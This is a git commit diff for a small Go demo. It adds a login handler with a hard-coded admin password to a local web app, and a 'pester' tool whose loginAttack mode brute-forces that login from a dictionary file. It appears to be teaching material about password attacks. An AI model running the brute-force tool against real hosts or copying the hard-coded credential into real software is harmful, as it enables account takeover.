d473dd385c26f3b48ebe513b0327b641f3a49b04
Aaron Bedra <aaron@aaronbedra.com>
2015-09-18 07:40:37 -0500

    Adding full login and attack

--- app/app.go
+++ app/app.go
@@ -1,42 +1,64 @@
 package main
 
 import (
-	"log"
-	"fmt"
-	"github.com/gorilla/mux"
-	"github.com/gorilla/handlers"
-	"html/template"
-	"net/http"
-	"os"
+        "log"
+        "fmt"
+        "github.com/gorilla/mux"
+        "github.com/gorilla/handlers"
+        "html/template"
+        "net/http"
+        "os"
 )
 
 type Page struct {
-	Title string
+        Title string
+        Error string
 }
 
-var templates = template.Must(template.ParseFiles("index.html"))
+var templates = template.Must(template.ParseFiles("index.html", "admin.html"))
 
 func LoginHandler(response http.ResponseWriter, request *http.Request) {
-	response.Header().Set("Content-type", "text/html")
-	err := request.ParseForm()
-	if err != nil {
-		http.Error(response, fmt.Sprintf("error parsing url %v", err), 500)
-	}
-	templates.ExecuteTemplate(response, "index.html", Page{Title: "Login"})
+        if (request.Method == "GET") {
+                response.Header().Set("Content-type", "text/html")
+                err := request.ParseForm()
+                if err != nil {
+                        http.Error(response, fmt.Sprintf("error parsing url %v", err), 500)
+                }
+                templates.ExecuteTemplate(response, "index.html", Page{Title: "Login"})
+        } else if (request.Method == "POST") {
+                request.ParseForm()
+                username := request.PostFormValue("inputEmail")
+                password := request.PostFormValue("inputPassword")
+
+                if (username == "admin@example.com" && password == "P4$$w0rd!") {
+			log.Println("Successfull login for admin@example.com")
+                        http.Redirect(response, request, "/admin", 302)
+                } else {
+			log.Println("Login failed for admin@example.com")
+			page := Page{Title: "Login", Error: "Username or Password Invalid"}
+                        templates.ExecuteTemplate(response, "index.html", page)
+                }
+        }
+}
+
+func AdminHandler(response http.ResponseWriter, request *http.Request) {
+        response.Header().Set("Content-type", "text/html")
+        err := request.ParseForm()
+        if err != nil {
+                http.Error(response, fmt.Sprintf("error parsing url %v", err), 500)
+        }
+        templates.ExecuteTemplate(response, "admin.html", Page{Title: "Admin"})
 }
 
 func main() {
-	r := mux.NewRouter()
-	r.Handle("/", handlers.LoggingHandler(os.Stdout, http.HandlerFunc(LoginHandler)))
-	r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
-	http.Handle("/", r)
+        r := mux.NewRouter()
+        r.Handle("/", handlers.LoggingHandler(os.Stdout, http.HandlerFunc(LoginHandler)))
+        r.Handle("/admin", handlers.LoggingHandler(os.Stdout, http.HandlerFunc(AdminHandler)))
+        r.PathPrefix("/static/").Handler(http.StripPrefix("/static/", http.FileServer(http.Dir("static"))))
+        http.Handle("/", r)
 
-	err := http.ListenAndServe("localhost:8080", r)
-	if err != nil {
-		log.Fatal("Error starting server: ", err)
-	}
+        err := http.ListenAndServe("localhost:8080", r)
+        if err != nil {
+                log.Fatal("Error starting server: ", err)
+        }
 }
-
-
-
-
--- pester/pester.go
+++ pester/pester.go
@@ -4,22 +4,83 @@ import (
 	"fmt"
 	"net/http"
 	"os"
-	"io/ioutil"
+	"flag"
+	"net/url"
+	"bufio"
 )
 
-func main() {
-	response, err := http.Get("http://localhost:8080")
+func ping(target string) {
+	fmt.Printf("Pinging %s ...", target)
+	response, err := http.Get(target)
 
 	if err != nil {
-		fmt.Printf("%s", err)
+		fmt.Printf("%s\n", err)
 		os.Exit(1)
 	} else {
 		defer response.Body.Close()
-		contents, err := ioutil.ReadAll(response.Body)
+		fmt.Printf(" [%s]\n", response.Status)
+	}
+}
+
+func loginAttack(target string, uri string) {
+	endpoint := fmt.Sprintf("%s%s", target, uri)
+	fmt.Println("Starting login attack on", endpoint)
+
+	file, err := os.Open("dictionary.txt")
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer file.Close()
+
+	var lines []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+
+	for _, password := range lines {
+		data := url.Values{}
+		data.Set("inputEmail", "admin@example.com")
+		data.Set("inputPassword", password)
+
+		response, err := http.PostForm(endpoint, data)
 		if err != nil {
-			fmt.Printf("%s", err)
-			os.Exit(1)
+			fmt.Println(err)
 		}
-		fmt.Printf("%s\n", string(contents))
+		defer response.Body.Close()
+		fmt.Println(response.Status)
+		if (response.StatusCode == 302) {
+			fmt.Println("The password is:", password)
+		}
+	}
+}
+
+func main() {
+	pingPtr := flag.Bool("ping", false, "Test to see if a host is available")
+
+	hostPtr := flag.String("host", "", "Set the host")
+	portPtr := flag.Int("port", 80, "Set the port")
+
+	loginAttackPtr := flag.String("loginAttack", "", "Hit the login endpoint of an application")
+
+	flag.Parse()
+
+	var target string
+
+	if (*hostPtr != "" && *portPtr != 0) {
+		target = fmt.Sprintf("http://%s:%d", *hostPtr, *portPtr)
+	} else {
+		fmt.Println("Must supply a host and port")
+		os.Exit(1)
+	}
+
+	if (*pingPtr == true) {
+		ping(target)
+		os.Exit(0)
+	}
+
+	if (*loginAttackPtr != "") {
+		loginAttack(target, *loginAttackPtr)
+		os.Exit(0)
 	}
 }
